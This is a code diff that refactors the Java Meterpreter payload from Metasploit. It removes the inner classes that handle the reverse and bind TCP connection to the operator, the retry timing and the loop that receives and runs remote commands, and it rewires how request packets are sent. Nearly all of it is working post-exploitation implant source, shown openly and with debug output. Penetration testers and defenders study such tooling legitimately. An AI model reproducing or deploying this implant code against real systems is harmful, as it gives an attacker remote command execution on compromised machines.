@@ -8,10 +8,6 @@ import java.io.EOFException;
 import java.io.IOException;
 import java.io.OutputStream;
 import java.io.PrintStream;
-import java.net.ServerSocket;
-import java.net.Socket;
-import java.net.SocketException;
-import java.net.SocketTimeoutException;
 import java.net.URL;
 import java.net.URLClassLoader;
 import java.net.URLConnection;
@@ -34,315 +30,19 @@ public class Meterpreter {
     public static final int UUID_LEN = 16;
     public static final int URL_LEN = 512;
 
+    private List/* <Channel> */channels = new ArrayList();
+    private final CommandManager commandManager;
+    private final Random rnd = new Random();
+    private final ByteArrayOutputStream errBuffer;
+    private final PrintStream err;
+    private final boolean loadExtensions;
+    private List/* <byte[]> */tlvQueue = null;
+
+
     private final TransportList transports = new TransportList();
     private byte[] uuid;
     private long sessionExpiry;
 
-    private class TransportList {
-        private Transport transport = null;
-        private Transport nextTransport = null;
-        private long wait = 0;
-
-        public boolean isEmpty() {
-            return this.transport == null;
-        }
-
-        public Transport current() {
-            return this.transport;
-        }
-
-        public boolean changeRequested() {
-            return this.nextTransport != null;
-        }
-
-        public void next(Meterpreter met) {
-            if (this.wait > 0) {
-                met.sleep(this.wait);
-                this.wait = 0;
-            }
-
-            if (this.nextTransport == null) {
-                this.transport = this.transport.getNext();
-            } else {
-                this.transport = this.nextTransport;
-                this.nextTransport = null;
-            }
-        }
-
-        public void add(Transport t) {
-            if (this.transport == null) {
-                // first transport, point it at itself
-                t.setNext(t);
-                t.setPrev(t);
-                this.transport = t;
-            } else {
-                // wire it into the end of the circular list
-                this.transport.getPrev().setNext(t);
-                t.setPrev(this.transport.getPrev());
-                t.setNext(this.transport);
-                this.transport.setPrev(t);
-            }
-        }
-    }
-
-    private abstract class Transport {
-        private Transport prev;
-        private Transport next;
-
-        protected String url;
-        protected long commTimeout;
-        protected long retryTotal;
-        protected long retryWait;
-
-        protected Transport(String url) {
-            this.url = url;
-        }
-
-        protected int parseTimeouts(byte[] configuration, int offset) {
-            // starts with the comms timeout
-            this.commTimeout = 1000L * Meterpreter.unpack32(configuration, offset);
-            System.out.println("msf : Comm timeout ms: " + this.commTimeout);
-            offset += 4;
-
-            // then we have the retry total
-            this.retryTotal = 1000L * Meterpreter.unpack32(configuration, offset);
-            System.out.println("msf : Retry total ms: " + this.retryTotal);
-            offset += 4;
-
-            // then we have the retry wait
-            this.retryWait = 1000L * Meterpreter.unpack32(configuration, offset);
-            System.out.println("msf : Retry Wait ms: " + this.retryWait);
-            offset += 4;
-
-            return offset;
-        }
-
-        protected abstract boolean tryConnect(Meterpreter met) throws IOException;
-
-        public abstract int parseConfig(byte[] configuration, int offset);
-        public abstract void bind(DataInputStream in, OutputStream rawOut);
-        public abstract void disconnect();
-        public abstract boolean dispatch(Meterpreter met, CommandManager commandManager);
-
-        public boolean connect(Meterpreter met) {
-            long lastAttempt = System.currentTimeMillis();
-
-            while (System.currentTimeMillis() < lastAttempt + this.retryTotal) {
-                try {
-                    if (this.tryConnect(met)) {
-                        return true;
-                    }
-                } catch (Exception e) {
-                }
-
-                met.sleep(this.retryWait);
-            }
-
-            return false;
-        }
-        public void setPrev(Transport t) {
-            this.prev = t;
-        }
-
-        public void setNext(Transport t) {
-            this.next = t;
-        }
-
-        public Transport getPrev() {
-            return this.prev;
-        }
-
-        public Transport getNext() {
-            return this.next;
-        }
-    }
-
-    private class TcpTransport extends Transport {
-        private Socket sock = null;
-        private DataInputStream inputStream = null;
-        private DataOutputStream outputStream = null;
-        private String host;
-        private int port;
-
-        public TcpTransport(String url) {
-            super(url);
-
-            int portStart = url.lastIndexOf(":");
-            this.port = Integer.parseInt(url.substring(portStart + 1));
-            this.host = url.substring(url.lastIndexOf("/") + 1, portStart);
-            System.out.println("msf : Host: " + this.host);
-            System.out.println("msf : Port: " + this.port);
-        }
-
-        public void bind(DataInputStream in, OutputStream rawOut) {
-            this.inputStream = in;
-            this.outputStream = new DataOutputStream(rawOut);
-        }
-
-        public int parseConfig(byte[] configuration, int offset) {
-            return this.parseTimeouts(configuration, offset);
-        }
-
-        public void disconnect() {
-            if (this.inputStream != null) {
-                try {
-                    this.inputStream.close();
-                }
-                catch (IOException ex) {
-                }
-                this.inputStream = null;
-            }
-            if (this.outputStream != null) {
-                try {
-                    this.outputStream.close();
-                }
-                catch (IOException ex) {
-                }
-                this.outputStream = null;
-            }
-            if (this.sock != null) {
-                try {
-                    this.sock.close();
-                }
-                catch (IOException ex) {
-                }
-                this.sock = null;
-            }
-        }
-
-        private void flushInputStream() throws IOException {
-            // we can assume that the server is trying to send the second
-            // stage at this point, so let's just read that in for now.
-            System.out.println("msf : Flushing the input stream");
-            // this includes 4 blobs of stuff we don't want
-            for (int i = 0; i < 4; i++) {
-                System.out.println("msf : Flushing the input stream: " + i);
-                int blobLen = this.inputStream.readInt();
-                System.out.println("msf : Discarding bytes: " + blobLen);
-                byte[] throwAway = new byte[blobLen];
-                this.inputStream.readFully(throwAway);
-            }
-        }
-
-        protected boolean tryConnect(Meterpreter met) throws IOException {
-            if (this.inputStream != null) {
-                // we're already connected
-                System.out.println("msf : Connecting on existing transport");
-                return true;
-            }
-
-            if (this.host.equals("")) {
-                ServerSocket server = new ServerSocket(this.port);
-                this.sock = server.accept();
-                server.close();
-            } else {
-                this.sock = new Socket(this.host, this.port);
-            }
-
-            if (this.sock != null) {
-                this.sock.setSoTimeout(500);
-                this.inputStream = new DataInputStream(this.sock.getInputStream());
-                this.outputStream = new DataOutputStream(this.sock.getOutputStream());
-
-                // this point we are effectively stageless, so flush the socket
-                this.flushInputStream();
-
-                return true;
-            }
-
-            return false;
-        }
-
-        /*
-         *
-    private TLVPacket executeCommand(TLVPacket request) throws IOException {
-        TLVPacket response = new TLVPacket();
-        String method = request.getStringValue(TLVType.TLV_TYPE_METHOD);
-        if (method.equals("core_switch_url")) {
-            String url = request.getStringValue(TLVType.TLV_TYPE_STRING);
-            int sessionExpirationTimeout = request.getIntValue(TLVType.TLV_TYPE_UINT);
-            int sessionCommunicationTimeout = request.getIntValue(TLVType.TLV_TYPE_LENGTH);
-            pollURL(new URL(url), sessionExpirationTimeout, sessionCommunicationTimeout);
-            return null;
-        } else if (method.equals("core_shutdown")) {
-            return null;
-        }
-        TLVPacket response = new TLVPacket();
-        String method = request.getStringValue(TLVType.TLV_TYPE_METHOD);
-        response.add(TLVType.TLV_TYPE_METHOD, method);
-        response.add(TLVType.TLV_TYPE_REQUEST_ID, request.getStringValue(TLVType.TLV_TYPE_REQUEST_ID));
-        Command cmd = commandManager.getCommand(method);
-        int result;
-        try {
-            result = cmd.execute(this, request, response);
-        } catch (Throwable t) {
-            t.printStackTrace(getErrorStream());
-            result = Command.ERROR_FAILURE;
-        }
-        TLVPacket response = new TLVPacket();
-        String method = request.getStringValue(TLVType.TLV_TYPE_METHOD);
-        response.add(TLVType.TLV_TYPE_METHOD, method);
-        response.add(TLVType.TLV_TYPE_REQUEST_ID, request.getStringValue(TLVType.TLV_TYPE_REQUEST_ID));
-        Command cmd = commandManager.getCommand(method);
-        int result;
-        try {
-            result = cmd.execute(this, request, response);
-        } catch (Throwable t) {
-            t.printStackTrace(getErrorStream());
-            result = Command.ERROR_FAILURE;
-        }
-        response.add(TLVType.TLV_TYPE_RESULT, result);
-        return response;
-    }
-         */
-
-        public boolean dispatch(Meterpreter met, CommandManager commandManager) {
-            System.out.println("msf : In the dispatch loop");
-            long lastPacket = System.currentTimeMillis();
-            while (!met.hasSessionExpired() &&
-                System.currentTimeMillis() < lastPacket + this.commTimeout) {
-                try {
-                    System.out.println("msf : Waiting for packet");
-                    int len = this.inputStream.readInt();
-                    int type = this.inputStream.readInt();
-                    TLVPacket request = new TLVPacket(this.inputStream, len - 8);
-
-                    System.out.println("msf : Packet received");
-
-                    // got a packet, update the timestamp
-                    lastPacket = System.currentTimeMillis();
-
-                    TLVPacket response = request.createResponse();
-                    int result = commandManager.executeCommand(met, request, response);
-
-                    byte[] data = response.toByteArray();
-                    synchronized (this.outputStream) {
-                        System.out.println("msf : sending response");
-                        this.outputStream.writeInt(data.length + 8);
-                        this.outputStream.writeInt(PACKET_TYPE_RESPONSE);
-                        this.outputStream.write(data);
-                        this.outputStream.flush();
-                        System.out.println("msf : sent response");
-                    }
-
-                    if (result == Command.EXIT_DISPATCH) {
-                        return true;
-                    }
-                } catch (SocketTimeoutException ex) {
-                    // socket comms timeout, didn't get a packet,
-                    // this is ok, so we ignore it
-                    System.out.println("msf : Socket timeout (OK)");
-                } catch (Exception ex) {
-                    // any other type of exception isn't good.
-                    System.out.println("msf : Some other exception: " + ex.getClass().getName());
-                    break;
-                }
-            }
-
-            // if we get here we assume things aren't good.
-            return false;
-        }
-    }
 
     private void loadConfiguration(DataInputStream in, OutputStream rawOut, byte[] configuration) {
         System.out.println("msf : Parsing configuration");
@@ -418,18 +118,6 @@ public class Meterpreter {
         }
         return res;
     }
-
-    private static final int PACKET_TYPE_REQUEST = 0;
-    private static final int PACKET_TYPE_RESPONSE = 1;
-
-    private List/* <Channel> */channels = new ArrayList();
-    private final CommandManager commandManager;
-    private final Random rnd = new Random();
-    private final ByteArrayOutputStream errBuffer;
-    private final PrintStream err;
-    private final boolean loadExtensions;
-    private List/* <byte[]> */tlvQueue = null;
-
 
     /**
      * Initialize the meterpreter.
@@ -515,38 +203,6 @@ public class Meterpreter {
     protected String getPayloadTrustManager() {
         return "com.metasploit.meterpreter.PayloadTrustManager";
     }
-
-    ///**
-    // * Execute a command request.
-    // *
-    // * @param request The request to execute
-    // * @return The response packet to send back
-    // */
-    //private TLVPacket executeCommand(TLVPacket request) throws IOException {
-    //    TLVPacket response = new TLVPacket();
-    //    String method = request.getStringValue(TLVType.TLV_TYPE_METHOD);
-    //    if (method.equals("core_switch_url")) {
-    //        String url = request.getStringValue(TLVType.TLV_TYPE_STRING);
-    //        int sessionExpirationTimeout = request.getIntValue(TLVType.TLV_TYPE_UINT);
-    //        int sessionCommunicationTimeout = request.getIntValue(TLVType.TLV_TYPE_LENGTH);
-    //        pollURL(new URL(url), sessionExpirationTimeout, sessionCommunicationTimeout);
-    //        return null;
-    //    } else if (method.equals("core_shutdown")) {
-    //        return null;
-    //    }
-    //    response.add(TLVType.TLV_TYPE_METHOD, method);
-    //    response.add(TLVType.TLV_TYPE_REQUEST_ID, request.getStringValue(TLVType.TLV_TYPE_REQUEST_ID));
-    //    Command cmd = commandManager.getCommand(method);
-    //    int result;
-    //    try {
-    //        result = cmd.execute(this, request, response);
-    //    } catch (Throwable t) {
-    //        t.printStackTrace(getErrorStream());
-    //        result = Command.ERROR_FAILURE;
-    //    }
-    //    response.add(TLVType.TLV_TYPE_RESULT, result);
-    //    return response;
-    //}
 
     /**
      * Poll from a given URL until a shutdown request is received.
@@ -717,8 +373,7 @@ public class Meterpreter {
             requestID[i] = (char) ('A' + rnd.nextInt(26));
         }
         tlv.add(TLVType.TLV_TYPE_REQUEST_ID, new String(requestID));
-        // TODO: put this back in
-        //writeTLV(PACKET_TYPE_REQUEST, tlv);
+        this.transports.current().writePacket(tlv, TLVPacket.PACKET_TYPE_REQUEST);
     }
 
     /**
